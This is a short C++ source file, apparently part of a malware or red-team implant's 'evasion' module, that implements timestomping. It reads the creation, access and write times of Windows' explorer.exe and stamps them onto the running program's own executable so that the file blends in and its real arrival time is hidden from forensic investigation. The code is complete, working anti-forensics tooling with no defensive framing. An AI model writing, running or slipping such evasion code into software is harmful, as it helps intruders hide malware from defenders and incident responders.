#include "core/evasion/timestomp.hpp"
#include <iostream>

bool Timestomp::CloneExplorer() {
    // 1. Open Explorer (ReadOnly)
    HANDLE hExplorer = CreateFileA("C:\\Windows\\explorer.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hExplorer == INVALID_HANDLE_VALUE) return false;

    FILETIME ftCreate, ftAccess, ftWrite;
    if(!GetFileTime(hExplorer, &ftCreate, &ftAccess, &ftWrite)) {
        CloseHandle(hExplorer);
        return false;
    }
    CloseHandle(hExplorer);

    // 2. Open Self (Write Attributes)
    char selfPath[MAX_PATH];
    if(!GetModuleFileNameA(NULL, selfPath, MAX_PATH)) return false;

    HANDLE hSelf = CreateFileA(selfPath, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hSelf == INVALID_HANDLE_VALUE) {
        // Retry with just GENERIC_WRITE? No, that locks it.
        // If we fail here, it's likely due to being in use.
        // But usually FILE_WRITE_ATTRIBUTES is okay.
        return false;
    }

    // 3. Clone Time
    bool result = SetFileTime(hSelf, &ftCreate, &ftAccess, &ftWrite);
    CloseHandle(hSelf);
    
    return result;
}
